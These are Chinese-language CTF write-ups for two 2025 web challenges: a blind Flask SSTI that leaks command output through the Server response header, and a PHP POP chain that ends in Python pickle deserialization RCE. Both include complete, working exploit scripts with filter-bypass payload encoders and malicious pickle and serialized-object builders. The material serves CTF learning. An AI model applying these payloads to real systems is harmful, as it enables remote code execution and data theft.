# [XYCTF 2025] Now you see me 2
这是`Now you see me 1`的续作，环境更加苛刻，没有任何直接回显。我们需要找到一种方法来外带执行结果。

## 漏洞分析
核心的漏洞点仍然是Flask的SSTI，但是由于没有回显，我们需要利用其他方式将命令执行的结果带出来。
这里利用`werkzeug.serving.WSGIRequestHandler.server_version`，通过修改响应头中的`Server`字段，将我们想要的数据作为`Server`头的值来外带。

## 攻击流程
1.  **构造payload**:
    我们需要构造一个payload，通过SSTI修改`werkzeug.serving.WSGIRequestHandler.server_version`的值为我们命令执行的结果。
    因为大部分的关键字都被过滤了，所以payload的构造过程和`Now you see me 1`类似，通过`request.endpoint`和`request.data`来获取我们需要的字符。

2.  **外带数据**:
    我们可以通过`os.popen('whoami').read()`来执行命令并读取结果，然后将结果设置为`server_version`的值。
    ```python
    # 伪代码
    from werkzeug.serving import WSGIRequestHandler
    WSGIRequestHandler.server_version = os.popen('whoami').read()
    ```

3.  **发送请求并观察响应头**:
    发送构造好的请求后，查看返回的HTTP响应头，我们就可以在`Server`字段中看到命令执行的结果。

exp:
```python
import re
payload = []

def generate_rce_command(cmd):
    global payload
    payloadstr = "{%print(request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('werkzeug')|attr('serving')|attr('WSGIRequestHandler')|attr('__setattr__')('server_version',request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('" + cmd + "')|attr('read')()))%}"

    required_encoding = re.findall('\'([a-z0-9_ /\\.]+)\'', payloadstr)

    offset_a = 16
    offset_0 = 6

    encoded_payloads = {}

    arg_count = 0
    for i in required_encoding:
        print(i)
        if i not in encoded_payloads:
            p = []
            for j in i:
                if j == '_':
                    p.append('k.2')
                elif j == ' ':
                    p.append('k.3')
                elif j == '.':
                    p.append('k.4')
                elif j == '-':
                    p.append('k.5')
                elif j.isnumeric():
                    a = str(ord(j)-ord('0')+offset_0)
                    p.append(f'k.{a}')
                elif j == '/':
                    p.append('k.68')
                else:
                    a = str(ord(j)-ord('a')+offset_a)
                    p.append(f'k.{a}')
            arg_name = f'a{arg_count}'
            encoded_arg = '{%' + '%0a'.join(['set', arg_name , '=', '~'.join(p)]) + '%}'
            encoded_payloads[i] = (arg_name, encoded_arg)
            arg_count+=1
            payload.append(encoded_arg)
    fully_encoded_payload = payloadstr
    for i in encoded_payloads.keys():
        if i in fully_encoded_payload:
            fully_encoded_payload = fully_encoded_payload.replace("'"+ i +"'", encoded_payloads[i][0])
    payload.append(fully_encoded_payload)
command = "cat /flag"
payload.append(r'{%for%0ai%0ain%0arequest.endpoint|slice(1)%}')
word_data = ''
endpoint = 'r3al_ins1de_th0ught'
for i in 'data':
    word_data += 'i.' + str(endpoint.find(i)) + '~'
word_data = word_data[:-1] # delete the last '~'
print("data: "+word_data)
payload.append(r'{%set%0adat='+word_data+'%}')
payload.append(r'{%for%0ak%0ain%0arequest|attr(dat)|string|slice(1)%0a%}')
generate_rce_command(command)


payload.append(r'{%endfor%}')
payload.append(r'{%endfor%}')
output = ''.join(payload)

print(r"Follow-your-heart-%23}"+output)
```

# [ISCTF 2025] 双生序列
这道题是 `来签个到吧` 的升级版，非常有趣，考察了PHP反序列化和Python反序列化的联动，形成一条完整的攻击链。

## 源码审计

首先题目给了几个关键的PHP文件源码。

**api.php - PHP反序列化入口**
```php
<?php
// api.php
// ...
$id = $_GET['id'] ?? 0;
$row = $db->query("SELECT content FROM notes WHERE id=" . intval($id))->fetch(PDO::FETCH_ASSOC);

if (!$row) {
    echo "喵喵喵?";
    exit(1);
}

$content = substr($row["content"], strlen("blueshark:"));

$allowed = ["Writer", "Shark", "Bridge"];
$o = @unserialize($content, ["allowed_classes" => $allowed]);

if (!($o instanceof Bridge)) {
    $cat->OwO();
    exit(1);
}

$r = $o->fetch();
echo nl2br(htmlspecialchars($r));
```
这是漏洞的起点。它从数据库获取内容，截断"blueshark:"前缀后进行反序列化。`allowed_classes`参数严格限制了我们能使用的类，并且最终对象必须是`Bridge`类的实例。

**classes.php - POP链核心**
```php
<?php
class Cat {
    public function OwO() { echo "喵喵喵?"; }
}

class Writer extends Cat {
    public $b64data = "";
    public $init = "no";
    private static $secret = 'kaqikaqi'; // 硬编码的密钥

    public function fetch() {
        if ($this->init === "init") {
            @mkdir("/tmp/ssxl", 0777, true);
        }
        return file_put_contents("/tmp/ssxl/write.bin", base64_decode($this->b64data));
    }

    public function __destruct() {
        $sig = hash_hmac('sha256', $this->b64data, self::$secret);
        file_put_contents("/tmp/ssxl/write.meta", $sig);
    }
}

class Shark extends Cat {
    public $ser = "";

    public function run() {
        return file_put_contents("/tmp/ssxl/run.bin", $this->ser);
    }

    public function __destruct() {
        $this->run();
    }
}

class Bridge extends Cat {
    public $writer;
    public $shark;

    public function fetch() {
        $next = $this->write; // 触发 __get
        if ($next instanceof Shark) {
            return $next;
        }
        return "喵喵喵!";
    }

    public function __get($name) {
        if ($name === "write") {
            if (!($this->writer instanceof Writer)){
                return "喵喵喵?";
            }
            $this->writer->fetch();
            return $this->shark;
        }
    }
}

class Pytools extends Cat {
    public function __call($name, $args) {
        return $this->run();
    }
    public function run() {
        $cmd = "python3 /var/www/html/pytools.py";
        $out = @shell_exec($cmd . " 2>&1");
        return $out;
    }
}
```
这里定义了POP链的各个组件。`Bridge`是核心，它的`fetch`方法会触发`__get`魔术方法，从而调用`Writer`的`fetch`方法。在对象销毁时，`Writer`和`Shark`的`__destruct`方法会被调用，分别写入`write.bin`、`write.meta`和`run.bin`。

**run.php - Python部分触发器**
```php
<?php
// run.php
$action = $_GET["action"] ?? "喵喵喵?";
if ($action !== "run") { exit(1); }

$binfile = "/tmp/ssxl/run.bin";
if (!file_exists($binfile)) { exit(1); }

$data = file_get_contents($binfile);
$allowed = ["Pytools"];
$exec = @unserialize($data, ["allowed_classes" => $allowed]);

if (method_exists($exec, "__call")) {
    $ret = $exec->blueshark(); // 触发 __call
}
```
该文件反序列化由`Shark`类写入的`run.bin`，得到`Pytools`对象。通过调用一个不存在的方法`blueshark()`来巧妙地触发`__call`魔术方法，从而执行`pytools.py`脚本。

**pytools.py - Python RCE**
```python
# pytools.py
# ... (imports) ...
class Pytools:
    # ...
    def run(self):
        # ...
        data = self.load_bin() # 加载 /tmp/ssxl/write.bin
        meta = self.load_meta() # 加载 /tmp/ssxl/write.meta
        assert self.sig_check(meta, data) # HMAC 校验

        payload = getattr(obj, 'payload', None)

        if isinstance(payload, (bytes, bytearray)):
            try:
                inner = pickle.loads(payload) # RCE 触发点
            # ...
```
这是攻击链的终点。脚本会加载`Writer`写入的`write.bin`和`write.meta`文件，用硬编码的密钥`'kaqikaqi'`进行HMAC签名校验。如果校验通过，它会读取`payload`属性并用`pickle.loads()`执行，从而造成远程代码执行。

## 漏洞利用链
1.  **入口 (`index.php`)**: 我们需要向`index.php`提交一个精心构造的PHP序列化字符串。这个字符串是一个`Bridge`对象。
2.  **`Bridge`对象**:
    *   `writer`属性是一个`Writer`对象。`$writer->b64data`包含我们恶意Python Pickle（`Set`对象）的Base64编码。
    *   `shark`属性是一个`Shark`对象。`$shark->ser`包含一个`Pytools`对象的PHP序列化字符串。
3.  **触发PHP反序列化 (`api.php`)**: 访问`api.php?id={note_id}`。
    *   `unserialize()`被调用，`Bridge`对象被创建。
    *   `$bridge->fetch()`被调用。
    *   `Bridge::__get('write')`被触发。
        *   `$writer->fetch()`被调用，将恶意的Python Pickle数据写入`/tmp/ssxl/write.bin`。
    *   `Bridge`对象和其属性`$writer`、`$shark`在请求结束时被销毁，触发它们的`__destruct`方法。
        *   `Writer::__destruct`被调用，计算HMAC签名并写入`/tmp/ssxl/write.meta`。
        *   `Shark::__destruct`被调用，`$shark->run()`将`Pytools`的序列化字符串写入`/tmp/ssxl/run.bin`。
4.  **触发Python反序列化 (`run.php`)**: 访问`run.php?action=run`。
    *   `run.php`读取并反序列化`/tmp/ssxl/run.bin`，得到`Pytools`对象。
    *   调用不存在的方法`blueshark()`，触发`Pytools::__call`。
    *   `__call`执行`pytools.py`。
    *   `pytools.py`读取`write.bin`和`write.meta`，验证HMAC签名。
    *   签名验证通过后，`pickle.loads()`执行`write.bin`中包含的恶意payload，实现RCE。

## exp
这里的exp脚本自动化了整个过程，从构造PHP序列化字符串到触发漏洞，最终获取flag。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import pickle
import requests

TARGET = "http://challenge.bluesharkinfo.com:25507/"
FLAG_PATH = "/flag"

# 本地定义一个同名 Set 类，用来生成外层 pickle
class Set:
    def __init__(self):
        self.secret = b""
        self.payload = b""

def build_inner_payload():
    """
    构造第二层的恶意 pickle，
    执行命令: cat /flag > /tmp/ssxl/outs.txt
    """
    cmd = f"cat {FLAG_PATH} > /tmp/ssxl/outs.txt"
    # 经典：cos\nsystem\n(S'cmd'\ntR.
    payload = (
        b"cos\n"
        b"system\n"
        b"(S'" + cmd.encode() + b"'\n"
        b"tR."
    )
    return payload

def build_outer_b64(inner_payload: bytes) -> str:
    """
    构造外层 Set 对象，并 base64 编码给 Writer 使用
    secret 必须等于 Writer::$secret = 'kaqikaqi'
    """
    s = Set()
    s.secret = b"kaqikaqi"  # 和 PHP 里 Writer::secret 一致
    s.payload = inner_payload

    raw = pickle.dumps(s)
    return base64.b64encode(raw).decode()

# === PHP 序列化构造辅助 ===

def php_str(s: str) -> str:
    """构造 s:<len>:"xxx"; 这种段"""
    return f's:{len(s)}:"{s}";'

def build_pytools_ser() -> str:
    """
    run.bin 中的内容，只需要是一个 Pytools 对象即可
    """
    return 'O:7:"Pytools":0:{}'

def build_writer(b64data: str) -> str:
    """
    Writer 对象的序列化
    """
    props = (
        php_str("b64data") + php_str(b64data) +
        php_str("init")    + php_str("init")
    )
    return f'O:6:"Writer":2:{{{props}}}'

def build_shark(pytools_ser: str) -> str:
    """
    Shark 对象，唯一属性 ser = Pytools 序列化
    """
    props = php_str("ser") + php_str(pytools_ser)
    return f'O:5:"Shark":1:{{{props}}}'

def build_bridge(b64data: str, pytools_ser: str) -> str:
    """
    Bridge(writer, shark) 序列化
    """
    writer_ser = build_writer(b64data)
    shark_ser = build_shark(pytools_ser)

    props = (
        php_str("writer") + writer_ser +
        php_str("shark")  + shark_ser
    )
    return f'O:6:"Bridge":2:{{{props}}}'

# === HTTP 交互 ===

sess = requests.Session()

def create_note(serialized_bridge: str) -> int:
    """
    步骤 1: POST /index.php 插入 note
    """
    data = {
        "s": "blueshark:" + serialized_bridge
    }
    r = sess.post(f"{TARGET}/index.php", data=data)
    print("[*] create_note status:", r.status_code)
    #  需要手动去页面看id
    note_id = int(input("[?] 请手动输入这条 note 的 id: "))
    return note_id

def trigger_api(note_id: int):
    """
    步骤 2: 访问 /api.php?id=note_id
    """
    params = {"id": note_id}
    r = sess.get(f"{TARGET}/api.php", params=params)
    print("[*] trigger_api status:", r.status_code)

def trigger_run():
    """
    步骤 3: 访问 /run.php?action=run
    """
    params = {"action": "run"}
    r = sess.get(f"{TARGET}/run.php", params=params)
    print("[*] trigger_run status:", r.status_code)
    print(r.text)

def main():
    inner = build_inner_payload()
    b64 = build_outer_b64(inner)
    pytools_ser = build_pytools_ser()

    bridge_ser = build_bridge(b64, pytools_ser)
    print("[*] Bridge serialized length:", len(bridge_ser))

    note_id = create_note(bridge_ser)
    trigger_api(note_id)
    trigger_run()
    print("[*] 攻击完成，请检查 /tmp/ssxl/outs.txt 文件内容。")

if __name__ == "__main__":
    main()
```
最终，payload会将flag输出到`/tmp/ssxl/outs.txt`。需要想办法读取该文件，例如修改`build_inner_payload`中的命令，使用`curl`或`nc`将文件内容外带。
